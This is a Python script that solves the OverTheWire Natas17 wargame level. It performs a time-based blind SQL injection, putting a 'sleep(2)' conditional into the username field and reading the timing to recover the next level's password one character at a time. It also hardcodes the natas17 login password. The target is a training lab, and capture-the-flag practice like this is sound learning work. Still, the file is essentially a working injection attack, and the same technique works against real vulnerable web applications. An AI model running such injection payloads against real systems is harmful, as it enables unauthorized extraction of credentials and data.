# Natas17 brute-force script :)
import requests, string, sys, time

# =======================
# === STYLING HELPERS ===
# =======================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def log_info(message):
    print(f"{CYAN}[*] {message}{RESET}")

def log_success(message):
    print(f"{GREEN}[+] {message}{RESET}")

def log_step(message):
    print(f"{YELLOW}[*] {message}{RESET}")

def log_progress_inline(message, color=CYAN):
    sys.stdout.write(f"\r{color}{message}{RESET}")
    sys.stdout.flush()

def log_found_inline(message):
    sys.stdout.write(f"\r{GREEN}{message}{RESET}\n")
    sys.stdout.flush()

def pause_short():
    time.sleep(0.05)
# =======================

# === CONFIG ===
url = "http://natas17.natas.labs.overthewire.org/"
username = "natas17"
natas17_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"   # login password for natas17
password = ""                                # this is the one we brute-force (natas18's password)
char_data = string.ascii_letters + string.digits
max_len = 32
# ==============

log_info("Starting brute-force on natas17...")
for count in range(1, max_len + 1):
    for c in char_data:
        injection = (
            f'natas18" AND IF(BINARY substring(password,1,{count}) = \'{password}{c}\', sleep(2), 0) -- '
        )
        response = requests.post(url, data={"username": injection}, auth=(username, natas17_password))

        if (response.elapsed.total_seconds() > 2):
            password += c
            log_found_inline(f"[FOUND] Position {count}: {c} -> {password}")
            break
        else:
            log_progress_inline(f"Trying pos {count}: {password}{c}")

log_success(f"Brute-force complete!")
log_step(f"Password: {password}")
